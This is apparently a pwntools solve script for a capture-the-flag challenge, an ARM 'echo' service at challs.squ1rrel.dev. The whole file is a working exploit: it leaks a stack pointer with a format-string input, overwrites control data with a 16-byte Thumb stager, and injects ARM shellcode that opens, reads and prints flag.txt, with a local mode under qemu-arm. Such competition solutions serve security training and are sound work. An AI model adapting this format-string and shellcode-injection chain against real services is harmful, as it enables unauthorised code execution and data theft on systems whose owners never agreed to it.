#!/usr/bin/env python3

from __future__ import annotations

import re
import sys

from pwn import asm, context, p32, process, remote, shellcraft


HOST = "challs.squ1rrel.dev"
PORT = 5003
STACK_LEAK_INDEX = 13
STACK_DELTA = 0x18C
THUMB_STAGER = bytes.fromhex("69460020ff22032701df0847")
FLAG_RE = re.compile(rb"squ1rrel\{[^}]+\}")


def build_arm_payload() -> bytes:
    context.clear(arch="arm", os="linux", endian="little")
    return asm(
        shellcraft.open("flag.txt", 0, 0)
        + shellcraft.read("r0", "sp", 0x80)
        + shellcraft.write(1, "sp", 0x80)
        + shellcraft.exit(0)
    )


def exploit(io) -> bytes:
    banner = io.recvline(timeout=2)
    if banner:
        sys.stdout.write(banner.decode("latin1", "replace"))

    io.send(f"%{STACK_LEAK_INDEX}$p\n".encode())
    leak_line = io.recvline(timeout=2).strip()
    if not leak_line.startswith(b"0x"):
        raise RuntimeError(f"unexpected leak line: {leak_line!r}")

    leaked_ptr = int(leak_line, 16)
    buffer_addr = leaked_ptr - STACK_DELTA
    sys.stdout.write(f"stack leak: {leak_line.decode()} -> buffer {buffer_addr:#x}\n")

    second_stage = THUMB_STAGER + p32(buffer_addr | 1)
    if len(second_stage) != 16:
        raise RuntimeError("second-stage overwrite must be exactly 16 bytes")

    io.send(second_stage)
    io.send(build_arm_payload())
    return io.recvall(timeout=3)


def main(argv: list[str]) -> int:
    mode = argv[1] if len(argv) > 1 else "remote"

    if mode == "local":
        io = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabi", "./starting_files/echo"])
    elif mode == "remote":
        io = remote(HOST, PORT)
    else:
        print("usage: solve.py [local|remote]", file=sys.stderr)
        return 2

    try:
        output = exploit(io)
    finally:
        io.close()

    if output:
        sys.stdout.write(output.decode("latin1", "replace"))

    match = FLAG_RE.search(output)
    if match:
        sys.stdout.write(f"flag: {match.group().decode()}\n")
        return 0

    print("flag not found in output", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))